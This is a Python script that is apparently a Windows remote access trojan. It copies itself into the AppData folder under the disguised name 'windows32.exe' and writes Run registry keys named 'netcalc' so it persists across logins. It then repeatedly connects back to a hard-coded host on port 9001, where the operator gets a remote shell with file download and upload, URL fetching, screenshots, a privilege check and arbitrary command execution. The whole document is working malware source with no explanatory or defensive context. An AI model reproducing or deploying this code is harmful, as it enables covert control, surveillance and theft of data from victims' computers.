#!/usr/bin/env python3
#_*_ coding: utf8 _*_


from glob import glob
import shutil
import socket
import os
import subprocess
import base64
import requests
import mss
import time
import sys

def adminCheck():
    global admin
    try:
        check = os.listdir(os.sep.join([os.environ.get("SystemRoot", 'C:\windows'), 'temp']))
    except:
        admin = "[!] NO ADMIN PRIVILEGES..."
    else:
        admin = "[*] ADMIN PRIVILEGES!"

def downloadFile(url):
    r = requests.get(url)
    name_file = url.split("/")[-1]
    with open(name_file, 'wb') as file_get:
        file_get.write(r.content)
        file_get.close()


def createPersistence():
    location = os.environ['appdata'] + '\\windows32.exe'
    if not os.path.exists(location):
        shutil.copyfile(sys.executable,location)
        subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v netcalc /t REG_SZ /d "' + location + '"', shell=True)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v netcalcl /t REG_SZ /d "' + location + '"', shell=True)
       
def connection():
    while True:
        time.sleep(5)
        try:
            client.connect(('192.168.1.12', 9001))
            shell()
        except:
            connection()

def screenShot():
    screen = mss.mss()
    screen.shot()

def shell():
    current_dir = os.getcwd().encode()
    client.send(current_dir)

    while True:
        res = client.recv(1024)
        res = res.decode()

        if res == "exit":
            break
        elif res[:2] == "cd" and len(res) > 2:
            os.chdir(res[3:])
            result = os.getcwd()
            client.send(result.encode())
        
        elif res[:8] == "download":
            with open(res[9:], 'rb') as file_download:
                client.send(base64.b64encode(file_download.read()))
        elif res[:6] == "upload":
            with open(res[7:], 'rb') as file_send:
                data = client.recv(30000)
                client.send(base64.b64decode(data))

        elif res[:3] == "get":
            try:
                downloadFile(res[4:])
                client.send(str.encode("[*] FILE DOWNLOADED!"))
            except:
                client.send(str.encode("[!] ERROR DOWNLOADING FILE..."))
        elif res[:10] == "screenshot":
            try:
                screenShot()
                with open('monitor-1.png', 'rb') as file_send:
                    client.send(base64.b64encode(file_send.read()))
                os.remove('monitor-1.png')
            except:
                client.send(base64.b64encode("fail"))
        elif res[:5] == "check":
            try:
                adminCheck()
                client.send(str.encode(admin))
            except:
                client.send(str.encode("[!] CAN'T CHECK PRIVILEGES..."))
        else:
            proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            if len(result) == 0:
                client.send(str.encode("1"))
            else:
                client.send(result)
      


createPersistence()
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
client.close()
